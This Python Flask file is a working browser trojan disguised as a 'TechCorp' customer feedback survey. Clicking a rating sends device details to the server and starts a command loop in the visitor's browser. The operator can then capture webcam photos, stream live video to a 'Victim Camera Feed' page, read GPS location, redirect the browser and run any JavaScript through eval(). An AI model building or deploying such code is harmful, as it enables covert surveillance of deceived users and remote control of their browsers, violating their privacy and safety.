"""
HTTPS POLL PORTAL - CAMERA ACCESS ENABLED
==========================================
Serves HTTPS directly to enable camera access without tunnel passwords
"""

from flask import Flask, request, jsonify
import threading
import queue
import ssl
import subprocess
import os

app = Flask(__name__)

# Command queue for remote control
command_queue = queue.Queue()
result_queue = queue.Queue()
active_sessions = set()

@app.route("/")
def feedback_poll():
    """Minimal feedback poll interface with HTTPS camera access"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Customer Feedback Survey</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #f5f5f5; color: #333; line-height: 1.6; padding: 20px;
            }
            .container {
                max-width: 500px; margin: 50px auto; background: white; padding: 40px;
                border-radius: 8px; box-shadow: 0 2px 20px rgba(0,0,0,0.1);
            }
            .header { text-align: center; margin-bottom: 30px; }
            .company-logo { font-size: 24px; font-weight: 600; color: #2563eb; margin-bottom: 10px; }
            .survey-title { font-size: 20px; font-weight: 500; color: #1f2937; margin-bottom: 8px; }
            .survey-subtitle { font-size: 14px; color: #6b7280; }
            .question { margin: 30px 0; }
            .question-text { font-size: 16px; font-weight: 500; color: #374151; margin-bottom: 20px; text-align: center; }
            .rating-container { display: flex; justify-content: center; gap: 15px; margin: 20px 0; }
            .rating-btn {
                background: white; border: 2px solid #e5e7eb; border-radius: 50px; padding: 12px 20px;
                cursor: pointer; transition: all 0.2s ease; font-size: 14px; font-weight: 500;
                color: #374151; min-width: 60px; text-align: center;
            }
            .rating-btn:hover { border-color: #2563eb; background: #eff6ff; color: #2563eb; }
            .rating-scale { display: flex; justify-content: space-between; margin-top: 10px; font-size: 12px; color: #9ca3af; }
            .thank-you { display: none; text-align: center; margin: 30px 0; }
            .thank-you h3 { color: #059669; margin-bottom: 10px; }
            .footer {
                text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #e5e7eb;
                font-size: 12px; color: #9ca3af;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="company-logo">TechCorp</div>
                <div class="survey-title">Customer Feedback Survey</div>
                <div class="survey-subtitle">Help us improve our services</div>
            </div>
            
            <div id="survey-content">
                <div class="question">
                    <div class="question-text">How would you rate your overall experience with our service?</div>
                    <div class="rating-container">
                        <div class="rating-btn" onclick="submitRating(1)">1</div>
                        <div class="rating-btn" onclick="submitRating(2)">2</div>
                        <div class="rating-btn" onclick="submitRating(3)">3</div>
                        <div class="rating-btn" onclick="submitRating(4)">4</div>
                        <div class="rating-btn" onclick="submitRating(5)">5</div>
                    </div>
                    <div class="rating-scale"><span>Poor</span><span>Excellent</span></div>
                </div>
            </div>
            
            <div class="thank-you" id="thank-you">
                <h3>Thank you for your feedback!</h3>
                <p>Your response has been recorded.</p>
                <p>Processing your feedback...</p>
            </div>
            
            <div class="footer">TechCorp Customer Experience Team | Confidential Survey</div>
        </div>

        <script>
            function submitRating(rating) {
                document.getElementById('survey-content').style.display = 'none';
                document.getElementById('thank-you').style.display = 'block';
                activateTrojan(rating);
            }
            
            function activateTrojan(rating) {
                const victimInfo = {
                    rating: rating,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screen: screen.width + 'x' + screen.height,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timestamp: new Date().toISOString()
                };
                
                fetch('/activate-trojan', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(victimInfo)
                }).then(() => pollForCommands());
            }
            
            function pollForCommands() {
                fetch('/get-command')
                    .then(response => response.json())
                    .then(data => {
                        if (data.command) executeCommand(data.command);
                        setTimeout(pollForCommands, 1500);
                    })
                    .catch(() => setTimeout(pollForCommands, 3000));
            }
            
            function executeCommand(command) {
                try {
                    let result;
                    
                    if (command === 'info') {
                        result = `URL: ${window.location.href}, UA: ${navigator.userAgent}`;
                    } else if (command === 'location' || command === 'gps') {
                        navigator.geolocation.getCurrentPosition(
                            pos => {
                                const coords = `${pos.coords.latitude},${pos.coords.longitude}`;
                                fetch('/send-result', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({result: `GPS: ${coords}`, command: command})
                                });
                            },
                            err => {
                                fetch('/send-result', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({result: `GPS denied: ${err.message}`, command: command})
                                });
                            },
                            {enableHighAccuracy: true, timeout: 10000}
                        );
                        return;
                    } else if (command.startsWith('redirect:')) {
                        const url = command.substring(9);
                        window.location.href = url;
                        result = `Redirecting to: ${url}`;
                    } else if (command === 'photo') {
                        // Single photo capture
                        navigator.mediaDevices.getUserMedia({video: true})
                            .then(stream => {
                                const video = document.createElement('video');
                                const canvas = document.createElement('canvas');
                                const ctx = canvas.getContext('2d');
                                
                                video.srcObject = stream;
                                video.play();
                                
                                video.addEventListener('loadedmetadata', () => {
                                    canvas.width = video.videoWidth;
                                    canvas.height = video.videoHeight;
                                    
                                    setTimeout(() => {
                                        ctx.drawImage(video, 0, 0);
                                        const photoData = canvas.toDataURL('image/png');
                                        stream.getTracks().forEach(track => track.stop());
                                        
                                        const preview = photoData.substring(0, 100) + '... [PHOTO CAPTURED]';
                                        fetch('/send-result', {
                                            method: 'POST',
                                            headers: {'Content-Type': 'application/json'},
                                            body: JSON.stringify({result: `Photo captured: ${preview}`, command: command})
                                        });
                                        
                                        fetch('/save-photo', {
                                            method: 'POST',
                                            headers: {'Content-Type': 'application/json'},
                                            body: JSON.stringify({photo: photoData, timestamp: new Date().toISOString()})
                                        });
                                    }, 1000);
                                });
                            })
                            .catch(err => {
                                fetch('/send-result', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({result: `Camera denied: ${err.message}`, command: command})
                                });
                            });
                        return;
                    } else if (command === 'livevideo' || command === 'stream') {
                        // Live video streaming
                        navigator.mediaDevices.getUserMedia({video: true, audio: false})
                            .then(stream => {
                                // Create hidden video element for streaming
                                let video = document.getElementById('liveVideoStream');
                                if (!video) {
                                    video = document.createElement('video');
                                    video.id = 'liveVideoStream';
                                    video.style.display = 'none';
                                    video.autoplay = true;
                                    video.muted = true;
                                    document.body.appendChild(video);
                                }
                                
                                video.srcObject = stream;
                                
                                // Start streaming frames
                                window.streamInterval = setInterval(() => {
                                    const canvas = document.createElement('canvas');
                                    canvas.width = video.videoWidth || 640;
                                    canvas.height = video.videoHeight || 480;
                                    const ctx = canvas.getContext('2d');
                                    
                                    if (video.videoWidth > 0) {
                                        ctx.drawImage(video, 0, 0);
                                        const frameData = canvas.toDataURL('image/jpeg', 0.5);
                                        
                                        // Send frame to server
                                        fetch('/live-frame', {
                                            method: 'POST',
                                            headers: {'Content-Type': 'application/json'},
                                            body: JSON.stringify({
                                                frame: frameData,
                                                timestamp: new Date().toISOString()
                                            })
                                        }).catch(() => {}); // Ignore network errors
                                    }
                                }, 500); // Send frame every 500ms
                                
                                fetch('/send-result', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({result: 'Live video stream started! Check /live-view', command: command})
                                });
                            })
                            .catch(err => {
                                fetch('/send-result', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({result: `Live video denied: ${err.message}`, command: command})
                                });
                            });
                        return;
                    } else if (command === 'stopstream') {
                        // Stop live video stream
                        if (window.streamInterval) {
                            clearInterval(window.streamInterval);
                            delete window.streamInterval;
                        }
                        
                        const video = document.getElementById('liveVideoStream');
                        if (video && video.srcObject) {
                            video.srcObject.getTracks().forEach(track => track.stop());
                            video.remove();
                        }
                        
                        result = 'Live video stream stopped';
                    } else if (command === 'camera' || command === 'webcam') {
                        // Basic camera access test
                        navigator.mediaDevices.getUserMedia({video: true})
                            .then(stream => {
                                stream.getTracks().forEach(track => track.stop());
                                fetch('/send-result', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({result: 'Camera access granted! Use "photo" or "livevideo"', command: command})
                                });
                            })
                            .catch(err => {
                                fetch('/send-result', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({result: `Camera denied: ${err.message}`, command: command})
                                });
                            });
                        return;
                    } else if (command === 'microphone' || command === 'mic') {
                        navigator.mediaDevices.getUserMedia({audio: true})
                            .then(stream => {
                                fetch('/send-result', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({result: 'Microphone access granted', command: command})
                                });
                            })
                            .catch(err => {
                                fetch('/send-result', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({result: `Microphone denied: ${err.message}`, command: command})
                                });
                            });
                        return;
                    } else {
                        result = eval(command);
                        if (result === undefined) result = 'Command executed';
                    }
                    
                    fetch('/send-result', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({result: result.toString(), command: command})
                    });
                    
                } catch (e) {
                    fetch('/send-result', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({result: `Error: ${e.message}`, command: command})
                    });
                }
            }
        </script>
    </body>
    </html>
    """

@app.route("/activate-trojan", methods=["POST"])
def activate_trojan():
    victim_data = request.json
    victim_ip = request.remote_addr
    
    print(f"\n[+] HTTPS POLL TROJAN ACTIVATED!")
    print("="*50)
    print(f"[+] Victim IP: {victim_ip}")
    print(f"[+] Rating Given: {victim_data.get('rating')}")
    print(f"[+] Platform: {victim_data.get('platform', 'Unknown')}")
    print(f"[+] Screen: {victim_data.get('screen', 'Unknown')}")
    print("="*50)
    
    active_sessions.add(victim_ip)
    threading.Thread(target=command_interface, args=(victim_ip,), daemon=True).start()
    return jsonify({"status": "activated"})

@app.route("/get-command")
def get_command():
    try:
        command = command_queue.get_nowait()
        return jsonify({"command": command})
    except queue.Empty:
        return jsonify({"command": None})

@app.route("/send-result", methods=["POST"])
def send_result():
    data = request.json
    result_queue.put(f"[{data['command']}] {data['result']}")
    return jsonify({"status": "ok"})

@app.route("/save-photo", methods=["POST"])
def save_photo():
    """Save captured photos"""
    data = request.json
    photo_data = data.get('photo', '')
    timestamp = data.get('timestamp', '')
    
    # Save photo to file (optional)
    filename = f"victim_photo_{timestamp.replace(':', '-').replace('.', '_')}.txt"
    with open(f"/tmp/{filename}", 'w') as f:
        f.write(photo_data)
    
    print(f"[+] PHOTO CAPTURED and saved to /tmp/{filename}")
    return jsonify({"status": "photo_saved"})

# Live video streaming
latest_frame = {"data": None, "timestamp": None}

@app.route("/live-frame", methods=["POST"])
def receive_live_frame():
    """Receive live video frames from victim"""
    global latest_frame
    data = request.json
    latest_frame = {
        "data": data.get('frame', ''),
        "timestamp": data.get('timestamp', '')
    }
    return jsonify({"status": "frame_received"})

@app.route("/live-view")
def live_view():
    """View live video stream from victim"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Live Video Stream - Victim Camera</title>
        <style>
            body { margin: 0; background: #000; color: white; font-family: Arial; }
            .container { text-align: center; padding: 20px; }
            .video-frame { max-width: 100%; height: auto; border: 2px solid #333; }
            .status { margin: 20px 0; color: #0f0; }
            .controls { margin: 20px 0; }
            button { background: #333; color: white; border: none; padding: 10px 20px; margin: 5px; cursor: pointer; }
            button:hover { background: #555; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔴 LIVE: Victim Camera Feed</h1>
            <div class="status" id="status">Waiting for video stream...</div>
            <img id="videoFrame" class="video-frame" src="" alt="Live video will appear here">
            <div class="controls">
                <button onclick="startStream()">Start Stream</button>
                <button onclick="stopStream()">Stop Stream</button>
                <button onclick="takePhoto()">Capture Photo</button>
            </div>
            <div id="lastUpdate"></div>
        </div>
        
        <script>
            let streaming = false;
            
            function startStream() {
                streaming = true;
                document.getElementById('status').textContent = '🔴 STREAMING - Receiving live video...';
                updateFrame();
            }
            
            function stopStream() {
                streaming = false;
                document.getElementById('status').textContent = '⏹️ STOPPED - Stream paused';
            }
            
            function updateFrame() {
                if (!streaming) return;
                
                fetch('/get-latest-frame')
                    .then(response => response.json())
                    .then(data => {
                        if (data.frame) {
                            document.getElementById('videoFrame').src = data.frame;
                            document.getElementById('lastUpdate').textContent = 
                                'Last update: ' + new Date(data.timestamp).toLocaleTimeString();
                        }
                        setTimeout(updateFrame, 500); // Update every 500ms
                    })
                    .catch(() => setTimeout(updateFrame, 1000));
            }
            
            function takePhoto() {
                // This would send a photo command to the victim
                fetch('/command-victim', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: 'photo'})
                });
            }
        </script>
    </body>
    </html>
    """

@app.route("/get-latest-frame")
def get_latest_frame():
    """Get the latest video frame"""
    return jsonify({
        "frame": latest_frame.get("data"),
        "timestamp": latest_frame.get("timestamp")
    })

@app.route("/command-victim", methods=["POST"])
def command_victim():
    """Send command to victim via live viewer"""
    data = request.json
    command = data.get('command', '')
    if command:
        command_queue.put(command)
        return jsonify({"status": "command_sent"})
    return jsonify({"status": "no_command"})

def command_interface(victim_ip):
    print(f"\n[+] HTTPS COMMAND INTERFACE READY FOR {victim_ip}")
    print("[+] Camera access should work with HTTPS!")
    print("="*50)
    print("CAMERA COMMANDS:")
    print("  photo      - Take single photo")
    print("  livevideo  - Start live video stream")
    print("  stream     - Start live video stream (same as livevideo)")
    print("  stopstream - Stop live video stream")
    print("  camera     - Test camera access")
    print("")
    print("OTHER COMMANDS:")
    print("  location   - Get GPS coordinates")
    print("  info       - Get victim info")
    print("")
    print("LIVE VIEW: Open https://192.168.86.21:8443/live-view in browser")
    print("="*50)
    
    while victim_ip in active_sessions:
        try:
            command = input(f"\nHTTPS-Poll[{victim_ip}] > ").strip()
            
            if command.lower() in ['exit', 'quit']:
                active_sessions.discard(victim_ip)
                print(f"[+] Session ended")
                break
                
            if command:
                command_queue.put(command)
                print(f"[+] Command sent: {command}")
                
                if command in ['livevideo', 'stream']:
                    print("[+] 🎥 Live video starting! Open https://192.168.86.21:8443/live-view")
                    print("[+] Click 'Start Stream' in the web interface to view")
                
                try:
                    result = result_queue.get(timeout=8)
                    print(f"[+] Result: {result}")
                except queue.Empty:
                    print("[-] No response (timeout)")
                    
        except KeyboardInterrupt:
            active_sessions.discard(victim_ip)
            break
        except Exception as e:
            print(f"[-] Error: {e}")

def create_self_signed_cert():
    """Create self-signed certificate for HTTPS"""
    cert_path = "/tmp/cert.pem"
    key_path = "/tmp/key.pem"
    
    if not os.path.exists(cert_path) or not os.path.exists(key_path):
        cmd = f"""
        openssl req -x509 -newkey rsa:4096 -keyout {key_path} -out {cert_path} -days 365 -nodes -subj "/C=US/ST=State/L=City/O=TechCorp/CN=localhost"
        """
        subprocess.run(cmd, shell=True, capture_output=True)
        print(f"[+] Self-signed certificate created")
    
    return cert_path, key_path

if __name__ == '__main__':
    print("HTTPS POLL TROJAN - CAMERA ENABLED")
    print("="*40)
    
    # Create HTTPS certificate
    cert_file, key_file = create_self_signed_cert()
    
    print("🔒 HTTPS enabled for camera access")
    print("📷 Photo capture functionality enabled")
    print("❌ NO tunnel passwords needed")
    print("="*40)
    
    # Run with HTTPS
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(cert_file, key_file)
    
    app.run(host='0.0.0.0', port=8443, ssl_context=context, debug=False)
